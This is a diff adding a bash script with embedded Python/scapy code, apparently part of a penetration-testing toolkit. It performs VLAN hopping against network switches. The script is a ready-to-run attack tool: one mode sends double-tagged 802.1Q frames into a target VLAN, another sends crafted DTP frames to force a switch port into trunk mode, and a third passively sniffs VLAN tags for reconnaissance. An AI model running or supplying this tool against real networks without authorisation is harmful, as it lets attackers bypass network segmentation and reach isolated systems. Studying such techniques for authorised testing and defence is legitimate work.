@@ -1,0 +1,179 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/vlan-hop
+# VLAN Hopping via double-tagging and DTP trunk negotiation
+# Ported from Raspyjack vlan_hopper.py (7h30th3r0n3) for ZERO-DAY OS arm64
+#
+# Two modes:
+#   double-tag — craft 802.1Q double-tagged frames to reach a target VLAN
+#   dtp        — send DTP (Dynamic Trunking Protocol) frames to negotiate trunk
+#
+# Usage: vlan-hop <mode> [iface] [native_vlan] [target_vlan]
+#
+# Deps: python3-scapy — apt install python3-scapy
+
+MODE="${1:-help}"
+IFACE="${2:-eth0}"
+NATIVE_VLAN="${3:-1}"
+TARGET_VLAN="${4:-10}"
+LOOT="/opt/cardputer/loot/recon"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+mkdir -p "$LOOT"
+
+RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
+YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
+
+[ "$(id -u)" -ne 0 ] && { echo -e "${RED}[!] Root required.${NC}"; exit 1; }
+python3 -c "import scapy" 2>/dev/null \
+    || { echo -e "${RED}[!] python3-scapy not found — apt install python3-scapy${NC}"; exit 1; }
+ip link show "$IFACE" &>/dev/null \
+    || { echo -e "${RED}[!] $IFACE not found${NC}"; exit 1; }
+
+echo -e "${BOLD}${CYAN}━━━ VLAN HOP — ZERO-DAY OS ━━━${NC}"
+echo -e "${CYAN}[*]${NC} Interface:    $IFACE"
+echo -e "${CYAN}[*]${NC} Native VLAN:  $NATIVE_VLAN"
+echo -e "${CYAN}[*]${NC} Target VLAN:  $TARGET_VLAN"
+echo -e "${CYAN}[*]${NC} Mode:         $MODE"
+echo ""
+
+case "$MODE" in
+double-tag|double|dt)
+    echo -e "${CYAN}[*]${NC} Double-tag attack: outer=$NATIVE_VLAN inner=$TARGET_VLAN"
+    echo -e "${YELLOW}[!]${NC} Sends ICMP ping to broadcast in VLAN $TARGET_VLAN. Ctrl+C to stop."
+    echo ""
+
+    python3 - "$IFACE" "$NATIVE_VLAN" "$TARGET_VLAN" << 'PYEOF'
+import sys, time, signal
+from scapy.all import (Ether, Dot1Q, IP, ICMP, sendp, sniff, conf, get_if_hwaddr)
+conf.verb = 0
+
+iface, native, target = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
+src_mac = get_if_hwaddr(iface)
+sent = 0
+
+def double_tagged_ping(dst_ip='255.255.255.255'):
+    return (
+        Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
+        Dot1Q(vlan=native) /     # outer tag (native vlan — stripped by switch)
+        Dot1Q(vlan=target) /     # inner tag (target vlan — forwarded)
+        IP(src='0.0.0.0', dst=dst_ip, ttl=64) /
+        ICMP()
+    )
+
+def sniff_responses(pkt):
+    if pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt[ICMP].type == 0:
+        src = pkt[IP].src
+        print(f'\033[0;32m[+]\033[0m Response from VLAN {target}: {src}')
+
+# Start response sniffer
+import threading
+sniffer = threading.Thread(
+    target=lambda: sniff(iface=iface, filter='icmp', prn=sniff_responses,
+                         store=False, timeout=30), daemon=True)
+sniffer.start()
+
+def stop(sig, frame):
+    print(f'\n\033[0;36m[*]\033[0m Sent {sent} double-tagged frames')
+    sys.exit(0)
+signal.signal(signal.SIGINT, stop)
+
+print(f'\033[0;36m[*]\033[0m Sending double-tagged frames to VLAN {target}...')
+while True:
+    pkt = double_tagged_ping()
+    sendp(pkt, iface=iface, verbose=False)
+    sent += 1
+    if sent % 10 == 0:
+        print(f'\r\033[0;36m[*]\033[0m Sent {sent} frames', end='', flush=True)
+    time.sleep(0.5)
+PYEOF
+    ;;
+
+dtp|trunk)
+    echo -e "${CYAN}[*]${NC} DTP trunk negotiation — advertising as a trunk port"
+    echo -e "${YELLOW}[!]${NC} Sending DTP frames to negotiate trunk mode. Ctrl+C to stop."
+    echo ""
+
+    python3 - "$IFACE" "$NATIVE_VLAN" << 'PYEOF'
+import sys, time, struct, signal
+from scapy.all import sendp, Ether, conf, get_if_hwaddr
+conf.verb = 0
+
+iface, native_vlan = sys.argv[1], int(sys.argv[2])
+src_mac = get_if_hwaddr(iface)
+sent = 0
+
+def dtp_frame():
+    # DTP TLVs: Domain (0x0001), Status (0x0002), DTP type (0x0003), Sender ID (0x0004)
+    domain   = b'\x00\x01\x00\x0f' + b'DTP\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    status   = b'\x00\x02\x00\x05\xa3'    # 0xa3 = Desirable, Auto
+    dtp_type = b'\x00\x03\x00\x05\xa5'    # 0xa5 = 802.1Q trunk
+    mac_b    = bytes.fromhex(src_mac.replace(':',''))
+    sender   = b'\x00\x04\x00\x0a' + mac_b
+    payload  = b'\xaa\xaa\x03\x00\x00\x0c\x20\x04' + domain + status + dtp_type + sender
+    return Ether(src=src_mac, dst='01:00:0c:cc:cc:cc') / payload
+
+def stop(sig, frame):
+    print(f'\n\033[0;36m[*]\033[0m Sent {sent} DTP frames. Check if switch port mode changed.')
+    sys.exit(0)
+signal.signal(signal.SIGINT, stop)
+
+print(f'\033[0;36m[*]\033[0m Sending DTP frames on {iface} (native VLAN {native_vlan})...')
+while True:
+    sendp(dtp_frame(), iface=iface, verbose=False)
+    sent += 1
+    if sent % 5 == 0:
+        print(f'\r\033[0;36m[*]\033[0m Sent {sent} DTP frames', end='', flush=True)
+    time.sleep(1)
+PYEOF
+    ;;
+
+detect|sniff)
+    echo -e "${CYAN}[*]${NC} Passively detecting 802.1Q VLAN tags on $IFACE"
+    echo -e "${CYAN}[*]${NC} Ctrl+C to stop"
+    echo ""
+    echo -e "  ${CYAN}SRC MAC             OUTER-VLAN  INNER-VLAN  Protocol${NC}"
+    echo "  ──────────────────────────────────────────────────────"
+
+    python3 - "$IFACE" << 'PYEOF'
+import sys, signal
+from scapy.all import sniff, Ether, Dot1Q, IP, conf
+conf.verb = 0
+
+iface = sys.argv[1]
+seen = set()
+
+def handle(pkt):
+    if not pkt.haslayer(Dot1Q): return
+    mac = pkt[Ether].src
+    outer = pkt[Dot1Q].vlan
+    inner = pkt[Dot1Q].payload.vlan if pkt[Dot1Q].payload.haslayer(Dot1Q) else '-'
+    proto = type(pkt[Dot1Q].payload.payload).__name__ if inner != '-' else type(pkt[Dot1Q].payload).__name__
+    key = f'{mac}{outer}{inner}'
+    if key not in seen:
+        seen.add(key)
+        print(f'  \033[0;36m{mac}\033[0m  VLAN:{outer:<6}  {str(inner):<10}  {proto}')
+        sys.stdout.flush()
+
+def stop(sig, frame):
+    print(f'\n\033[0;36m[*]\033[0m Detected {len(seen)} unique VLAN-tagged flows')
+    sys.exit(0)
+signal.signal(signal.SIGINT, stop)
+sniff(iface=iface, store=False, prn=handle)
+PYEOF
+    ;;
+
+*)
+    echo "Usage: vlan-hop <mode> [iface] [native_vlan] [target_vlan]"
+    echo ""
+    echo "Modes:"
+    echo "  double-tag  — Send 802.1Q double-tagged frames to reach target VLAN"
+    echo "  dtp         — Send DTP frames to negotiate trunk mode with switch"
+    echo "  detect      — Passively sniff 802.1Q tags (recon first)"
+    echo ""
+    echo "Examples:"
+    echo "  vlan-hop detect eth0"
+    echo "  vlan-hop double-tag eth0 1 20    # native=1, target=20"
+    echo "  vlan-hop dtp eth0 1"
+    exit 1
+    ;;
+esac
